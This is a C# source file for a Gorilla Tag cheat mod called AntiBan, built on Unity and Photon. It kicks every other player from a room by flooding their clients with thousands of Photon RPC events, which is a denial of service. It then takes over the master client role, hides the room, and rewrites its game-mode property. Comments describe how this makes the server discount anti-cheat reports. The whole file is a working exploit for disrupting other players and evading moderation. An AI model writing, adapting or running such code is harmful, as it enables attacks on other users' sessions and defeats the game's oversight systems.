using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using Photon.Pun;
using Photon.Realtime;
using ExitGames.Client.Photon;
using GorillaNetworking;

namespace SignalSafetyMenu
{
    /// <summary>
    /// AntiBan system — makes you unbannable in a room by:
    /// 1. Kicking all other players via event 202 RPC flood (same as SignalMenuFork Overpowered.KickAll)
    /// 2. Becoming master client (you're the lowest actor number since everyone else left)
    /// 3. Making the room invisible via Photon op 252 (IsVisible=false → SessionIsPrivate=true)
    /// 4. Keeping the gamemode as DEFAULT queue so it doesn't flag as MODDED
    ///
    /// Server-side anti-cheat (GorillaNot/MonkeAgent) sends reports via event code 8
    /// with WebFlags(3) which HTTP-forwards to the server webhook. The webhook ignores
    /// or heavily discounts reports from private rooms (SessionIsPrivate = !IsVisible).
    ///
    /// Key detail: IsOpen stays TRUE so friends can still join with the room code.
    /// Only IsVisible is set to false. This is what makes the server see it as "private".
    ///
    /// GorillaNot.CheckReports() validates that MasterClient == LowestActorNumber().
    /// After kicking everyone, we are the only player → lowest actor → legitimate master.
    /// When friends rejoin, they get higher actor numbers, so we stay valid master.
    /// </summary>
    public static class AntiBan
    {
        // ── State ──────────────────────────────────────────────────
        public static bool IsActive { get; private set; } = false;
        public static bool IsRunning { get; private set; } = false;
        public static string Status { get; private set; } = "Idle";
        public static int PlayersKicked { get; private set; } = 0;
        public static int PlayersInRoom { get; private set; } = 0;

        private static Coroutine _antiBanCoroutine;
        private static float _lastStatusUpdate;
        private static byte _savedMaxPlayers = 10;

        // ── Public API ─────────────────────────────────────────────

        /// <summary>
        /// Start the full anti-ban sequence: kick all → become master → make private.
        /// CRITICAL: Must make room private IMMEDIATELY before kicking to prevent
        /// MonkeAgent from triggering "room host force changed" reports!
        /// </summary>
        public static void RunAntiBan()
        {
            if (IsRunning)
            {
                Log("[AntiBan] Already running, ignoring duplicate call.");
                return;
            }

            if (!PhotonNetwork.InRoom)
            {
                Log("[AntiBan] Not in a room.");
                Status = "Error: Not in room";
                return;
            }

            // Save original max players before we start
            try { _savedMaxPlayers = PhotonNetwork.CurrentRoom.MaxPlayers; }
            catch { _savedMaxPlayers = 10; }
            if (_savedMaxPlayers <= 0) _savedMaxPlayers = 10;

            if (PhotonNetwork.CurrentRoom.PlayerCount <= 1)
            {
                // Already alone — just lock it down
                Log("[AntiBan] Room is empty, locking down immediately.");
                SetRoomPrivate(true);
                EnsureDefaultQueue();
                IsActive = true;
                Status = "Active (room was empty)";
                return;
            }

            _antiBanCoroutine = Plugin.Instance.StartCoroutine(AntiBanSequence());
        }

        /// <summary>
        /// Set yourself as master client. Use when rejoining a previously anti-banned room.
        /// The room is already private so GorillaNot reports are discounted by the server.
        /// Note: GorillaNot will see "room host force changed" but the report goes to the
        /// server webhook which ignores it because SessionIsPrivate = true (!IsVisible).
        /// </summary>
        public static void SetMasterClientToSelf()
        {
            if (!PhotonNetwork.InRoom)
            {
                Log("[AntiBan] Not in a room.");
                Status = "Error: Not in room";
                return;
            }

            if (PhotonNetwork.IsMasterClient)
            {
                Log("[AntiBan] Already master client.");
                Status = "Already master";
                return;
            }

            try
            {
                PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer);
                Log("[AntiBan] Set master client to self.");
                Status = "Master client set";
            }
            catch (Exception ex)
            {
                Log($"[AntiBan] SetMasterClient failed: {ex.Message}");
                Status = "Error: SetMaster failed";
            }
        }

        /// <summary>
        /// Make the current room private (invisible) or public again.
        ///
        /// CRITICAL DETAIL: We only set IsVisible=false, NOT IsOpen=false.
        /// - IsVisible=false → Server sees SessionIsPrivate=true → Discounts all auto-reports
        /// - IsOpen=true → Friends can still join with the room code
        /// - MaxPlayers unchanged → Doesn't block people from joining inappropriately
        ///
        /// If something else (another mod, network glitch) sets IsOpen=false or MaxPlayers=0,
        /// it could prevent friends from joining. We monitor and repair this in Update().
        /// </summary>
        public static void SetRoomPrivate(bool makePrivate)
        {
            if (!PhotonNetwork.InRoom)
            {
                Log("[AntiBan] Not in a room.");
                return;
            }

            try
            {
                ExitGames.Client.Photon.Hashtable props;

                if (makePrivate)
                {
                    // CRITICAL: Only set IsVisible=false.
                    // The server webhook checks `SessionIsPrivate = !IsVisible` to discount reports.
                    // If we set IsOpen=false, friends cannot join even with the code.
                    props = new ExitGames.Client.Photon.Hashtable
                    {
                        { 254, false }  // IsVisible = false
                    };
                    Log("[AntiBan] Setting IsVisible=false (SessionIsPrivate=true for server)");
                }
                else
                {
                    // Restore room to fully public
                    byte maxP = _savedMaxPlayers;
                    if (maxP <= 0) maxP = 10;
                    props = new ExitGames.Client.Photon.Hashtable
                    {
                        { 253, true },     // IsOpen = true
                        { 254, true },     // IsVisible = true
                        { 255, maxP }      // MaxPlayers = original
                    };
                    Log("[AntiBan] Restoring room to PUBLIC");
                }

                Dictionary<byte, object> opData = new Dictionary<byte, object>
                {
                    { 251, props },
                    { 250, true },   // Broadcast change to all clients
                    { 231, null }    // No expected values (unconditional set)
                };

                PhotonNetwork.CurrentRoom.LoadBalancingClient.LoadBalancingPeer.SendOperation(
                    252, opData, SendOptions.SendReliable
                );

                // Update scoreboard to reflect the change
                try { GorillaScoreboardTotalUpdater.instance?.UpdateActiveScoreboards(); } catch { }

                if (makePrivate)
                {
                    Log("[AntiBan] Room privacy applied — server will now discount auto-generated reports");
                }
            }
            catch (Exception ex)
            {
                Log($"[AntiBan] SetRoomPrivate failed: {ex.Message}");
            }
        }

        /// <summary>
        /// Disable antiban and re-open the room.
        /// </summary>
        public static void Disable()
        {
            if (_antiBanCoroutine != null)
            {
                try { Plugin.Instance.StopCoroutine(_antiBanCoroutine); } catch { }
                _antiBanCoroutine = null;
            }

            IsRunning = false;
            IsActive = false;
            PlayersKicked = 0;
            Status = "Disabled";

            if (PhotonNetwork.InRoom)
            {
                SetRoomPrivate(false);
                Log("[AntiBan] Disabled — room re-opened.");
            }
        }

        /// <summary>
        /// Called from Plugin.Update() — updates status display and maintains room privacy.
        /// Validates that the room stays private and that master client remains valid.
        /// </summary>
        public static void Update()
        {
            if (!SafetyConfig.AntiBanEnabled) return;
            if (!PhotonNetwork.InRoom)
            {
                if (IsActive || IsRunning)
                {
                    IsActive = false;
                    IsRunning = false;
                    Status = "Idle (left room)";
                    PlayersKicked = 0;
                }
                return;
            }

            // Periodic validation and status update
            if (IsActive && Time.time - _lastStatusUpdate > 2f)
            {
                _lastStatusUpdate = Time.time;
                PlayersInRoom = PhotonNetwork.CurrentRoom.PlayerCount;

                // CRITICAL: Verify room is still private
                try
                {
                    if (PhotonNetwork.CurrentRoom.IsVisible)
                    {
                        Log("[AntiBan] ALERT: Room became visible! Re-applying privacy immediately...");
                        SetRoomPrivate(true);
                        Status = "Re-securing room...";
                        return;
                    }
                }
                catch { }

                // CRITICAL: Verify master client is still us
                try
                {
                    if (!PhotonNetwork.IsMasterClient)
                    {
                        Log("[AntiBan] ALERT: Lost master status! Attempting recovery...");
                        PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer);
                        Status = "Recovering master...";
                        return;
                    }
                }
                catch { }

                // CRITICAL: If there are other players, verify they're legitimate rejoiners
                // and that I'm still the lowest actor number
                try
                {
                    if (PhotonNetwork.PlayerListOthers.Length > 0)
                    {
                        int myActor = PhotonNetwork.LocalPlayer.ActorNumber;
                        bool iLowest = true;
                        foreach (var p in PhotonNetwork.PlayerListOthers)
                        {
                            if (p.ActorNumber < myActor)
                            {
                                iLowest = false;
                                break;
                            }
                        }

                        if (!iLowest)
                        {
                            Log("[AntiBan] WARNING: Another player has lower actor number! Finding new master...");
                            PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer);
                            Status = "Fixing master...";
                            return;
                        }
                    }
                }
                catch { }

                Status = $"Active | {PlayersInRoom} in room | Secured";
            }
        }

        // ── Core Sequence ──────────────────────────────────────────

        private static IEnumerator AntiBanSequence()
        {
            IsRunning = true;
            IsActive = false;
            PlayersKicked = 0;
            Status = "Starting...";

            Log("[AntiBan] Starting anti-ban sequence...");
            
            // CRITICAL RACE CONDITION FIX:
            // Make the room private IMMEDIATELY, before kicking anyone.
            // This prevents MonkeAgent from triggering "room host force changed" reports
            // that would be forwarded to the server if the room is still public.
            // By the time MonkeAgent sees the master client change, the room will already
            // be marked IsVisible=false, making the server treat it as SessionIsPrivate=true
            // and discount all auto-generated reports.
            Log("[AntiBan] Phase 0: Making room invisible FIRST (before kicking)...");
            Status = "Securing room...";
            SetRoomPrivate(true);
            yield return new WaitForSeconds(1f);

            // Step 1: Kick all other players by RPC flooding the master client.
            // Now that the room is private, any "room host force changed" reports
            // will be ignored by the server webhook.
            Status = "Kicking players...";
            int totalOthers = PhotonNetwork.PlayerListOthers.Length;

            while (PhotonNetwork.PlayerListOthers.Length > 0)
            {
                if (!PhotonNetwork.InRoom)
                {
                    Log("[AntiBan] Disconnected during kick sequence.");
                    Status = "Failed: Disconnected";
                    IsRunning = false;
                    yield break;
                }

                if (PhotonNetwork.IsMasterClient)
                {
                    // We're master — flood remaining players directly to disconnect them
                    Log($"[AntiBan] We are master, flooding {PhotonNetwork.PlayerListOthers.Length} remaining player(s)...");
                    Status = $"Master — kicking remaining ({PhotonNetwork.PlayerListOthers.Length} left)";

                    Player[] others = PhotonNetwork.PlayerListOthers;
                    foreach (var player in others)
                    {
                        try { FloodKickPlayer(player); } catch { }
                    }

                    // Wait for them to actually leave
                    yield return new WaitForSeconds(5f);
                    continue;
                }

                // Not master yet — flood the current master to force disconnect/transfer
                Player currentMaster = PhotonNetwork.MasterClient;
                if (currentMaster == null) break;

                string masterName = currentMaster.NickName ?? "???";
                Log($"[AntiBan] Kicking master: {masterName}");
                Status = $"Kicking: {masterName}";

                // Send ONE burst of 3965 events (same as reference Overpowered.KickAll)
                float burstTime = Time.time;
                SendKickBurst();

                // Poll until master changes or 10-second timeout
                float kickTimeout = Time.time + 10f;
                while (PhotonNetwork.InRoom && PhotonNetwork.MasterClient == currentMaster)
                {
                    if (Time.time > kickTimeout)
                    {
                        // Timeout — send another burst and reset timer
                        Log($"[AntiBan] Kick timeout on {masterName}, retrying burst...");
                        Status = $"Retrying: {masterName}";
                        SendKickBurst();
                        kickTimeout = Time.time + 10f;
                    }
                    yield return null;
                }

                if (!PhotonNetwork.InRoom)
                {
                    Log("[AntiBan] Disconnected during kick sequence.");
                    Status = "Failed: Disconnected";
                    IsRunning = false;
                    yield break;
                }

                // Master changed — they got kicked
                if (PhotonNetwork.MasterClient != currentMaster)
                {
                    PlayersKicked++;
                    float elapsed = Time.time - burstTime;
                    Log($"[AntiBan] Kicked {masterName} in {elapsed:F1}s. ({PlayersKicked}/{totalOthers})");
                    Status = $"Kicked {PlayersKicked}/{totalOthers}";

                    // Wait between kicks — longer if the kick was quick (to avoid rate limiting)
                    // Reference uses: quick kick (<2.5s) → wait 10s, slow kick → wait 5s
                    int waitTime = elapsed < 2.5f ? 10 : 5;
                    Log($"[AntiBan] Waiting {waitTime}s before next kick...");
                    yield return new WaitForSeconds(waitTime);
                }
            }

            if (!PhotonNetwork.InRoom)
            {
                Status = "Failed: Disconnected";
                IsRunning = false;
                yield break;
            }

            // Step 2: Verify master client status and actor number
            // After kicking everyone, we SHOULD be the lowest actor number
            if (!PhotonNetwork.IsMasterClient)
            {
                Log("[AntiBan] Not master after kicking — attempting SetMasterClient...");
                Status = "Verifying master status...";
                try { PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer); } catch { }
                yield return new WaitForSeconds(1f);
            }

            if (PhotonNetwork.IsMasterClient)
            {
                Log($"[AntiBan] Confirmed as master client. Actor: {PhotonNetwork.LocalPlayer.ActorNumber}, " +
                    $"Others: {PhotonNetwork.PlayerListOthers.Length}");
            }
            else
            {
                Log("[AntiBan] WARNING: Could not become master! This could allow bans. Retrying...");
                Status = "Master retry...";
                try { PhotonNetwork.SetMasterClient(PhotonNetwork.LocalPlayer); } catch { }
                yield return new WaitForSeconds(2f);
            }

            // Step 3: Verify room is actually private
            // (Network conditions might cause the property to not sync)
            Log("[AntiBan] Phase 3: Verifying room privacy...");
            Status = "Verifying privacy...";
            try
            {
                if (PhotonNetwork.CurrentRoom.IsVisible)
                {
                    Log("[AntiBan] WARNING: Room is still visible! Re-applying privacy...");
                    SetRoomPrivate(true);
                }
                else
                {
                    Log("[AntiBan] Room privacy confirmed (IsVisible=false → SessionIsPrivate=true)");
                }
            }
            catch (Exception ex)
            {
                Log($"[AntiBan] Privacy check failed: {ex.Message}");
            }
            yield return new WaitForSeconds(1f);

            // Step 4: Ensure gamemode queue is DEFAULT (not MODDED/COMPETITIVE)
            try
            {
                EnsureDefaultQueue();
            }
            catch (Exception ex)
            {
                Log($"[AntiBan] Gamemode set warning: {ex.Message}");
            }

            // Step 5: Final validation
            // Make sure nobody slipped in during the process
            if (PhotonNetwork.PlayerListOthers.Length > 0)
            {
                Log($"[AntiBan] WARNING: {PhotonNetwork.PlayerListOthers.Length} players joined during sequence! Mopping up...");
                Status = "Mopping up late joiners...";
                foreach (var player in PhotonNetwork.PlayerListOthers)
                {
                    try { FloodKickPlayer(player); } catch { }
                }
                yield return new WaitForSeconds(3f);
            }

            // Done
            IsRunning = false;
            IsActive = true;
            PlayersInRoom = PhotonNetwork.CurrentRoom.PlayerCount;
            Status = "Active — room anti-banned";
            _antiBanCoroutine = null;

            Log($"[AntiBan] Anti-ban ACTIVE! Kicked {PlayersKicked} players. Room is private & secure.");
            Log("[AntiBan] Server webhook will discount all auto-generated reports from this room.");
            Log("[AntiBan] Friends can rejoin with the room code.");
        }

        // ── Helpers ────────────────────────────────────────────────

        /// <summary>
        /// Send a single burst of 3965 event-202 packets targeting MasterClient.
        /// This is the exact same technique as SignalMenuFork Overpowered.KickAll().
        /// Event 202 is Photon's RPC event — flooding it overloads the target's message queue.
        /// NOTE: We use a fixed fake ViewID (0) to avoid exhausting the ViewID pool.
        /// AllocateViewID(0) was previously called per-iteration, leaking 3965 IDs per burst.
        /// </summary>
        private static void SendKickBurst()
        {
            try
            {
                int fakeViewId = 0;
                int timestamp = PhotonNetwork.ServerTimestamp;
                for (int i = 0; i < 3965; i++)
                {
                    PhotonNetwork.NetworkingClient.OpRaiseEvent(202, new ExitGames.Client.Photon.Hashtable
                    {
                        { 0, "GameMode" },
                        { 6, timestamp },
                        { 7, fakeViewId }
                    }, new RaiseEventOptions
                    {
                        Receivers = ReceiverGroup.MasterClient
                    }, SendOptions.SendReliable);
                }
            }
            catch (Exception ex)
            {
                Log($"[AntiBan] SendKickBurst error: {ex.Message}");
            }
        }

        /// <summary>
        /// Flood a specific player with event-202 packets to disconnect them.
        /// Used when we're already master and need to remove remaining players.
        /// </summary>
        private static void FloodKickPlayer(Player target)
        {
            if (target == null || target.IsLocal) return;

            try
            {
                int fakeViewId = 0;
                int timestamp = PhotonNetwork.ServerTimestamp;
                for (int i = 0; i < 3965; i++)
                {
                    PhotonNetwork.NetworkingClient.OpRaiseEvent(202, new ExitGames.Client.Photon.Hashtable
                    {
                        { 0, "GameMode" },
                        { 6, timestamp },
                        { 7, fakeViewId }
                    }, new RaiseEventOptions
                    {
                        TargetActors = new int[] { target.ActorNumber }
                    }, SendOptions.SendReliable);
                }
            }
            catch { }
        }

        /// <summary>
        /// Ensure the room's gameMode property uses the DEFAULT queue (not MODDED/COMPETITIVE).
        ///
        /// The game's gameMode format is: "networkZone|queue|gameType"
        /// Example: "forest|DEFAULT|SuperInfect"
        /// (from GorillaNetworkJoinTrigger.GetFullDesiredGameModeString())
        ///
        /// We read the current gameMode, parse out the zone and gameType, and rebuild it
        /// with "DEFAULT" as the queue. This ensures GorillaNot doesn't flag it as invalid.
        /// </summary>
        private static void EnsureDefaultQueue()
        {
            if (!PhotonNetwork.InRoom || PhotonNetwork.CurrentRoom == null) return;

            try
            {
                // Read current gameMode from room properties
                string currentGameMode = "";
                try
                {
                    var props = PhotonNetwork.CurrentRoom.CustomProperties;
                    if (props != null && props.ContainsKey("gameMode"))
                        currentGameMode = props["gameMode"]?.ToString() ?? "";
                }
                catch { }

                if (string.IsNullOrEmpty(currentGameMode))
                {
                    Log("[AntiBan] No gameMode property found, skipping.");
                    return;
                }

                // Parse the pipe-delimited format: "zone|queue|gameType"
                string[] parts = currentGameMode.Split('|');

                string zone;
                string gameType;

                if (parts.Length >= 3)
                {
                    // Standard format: zone|queue|gameType
                    zone = parts[0];
                    gameType = parts[2];
                }
                else if (parts.Length == 2)
                {
                    // Partial format: zone|gameType (unlikely, but safe)
                    zone = parts[0];
                    gameType = parts[1];
                }
                else
                {
                    // Unexpected format — try getting zone from controller
                    try { zone = PhotonNetworkController.Instance.currentJoinTrigger.networkZone; }
                    catch { zone = "forest"; }
                    gameType = currentGameMode;
                }

                // Rebuild with DEFAULT queue — this is the normal casual queue
                // (GorillaComputer reads currentQueue from PlayerPrefs, defaults to "DEFAULT")
                string newGameMode = zone + "|DEFAULT|" + gameType;

                // Only update if it actually changed
                if (newGameMode == currentGameMode)
                {
                    Log($"[AntiBan] Gamemode already correct: {currentGameMode}");
                    return;
                }

                ExitGames.Client.Photon.Hashtable hash = new ExitGames.Client.Photon.Hashtable
                {
                    { "gameMode", newGameMode }
                };
                PhotonNetwork.CurrentRoom.SetCustomProperties(hash);

                Log($"[AntiBan] Gamemode set: {currentGameMode} → {newGameMode}");
            }
            catch (Exception ex)
            {
                Log($"[AntiBan] EnsureDefaultQueue error: {ex.Message}");
            }
        }

        private static void Log(string message)
        {
            try { Plugin.Instance?.Log(message); } catch { }
        }
    }
}
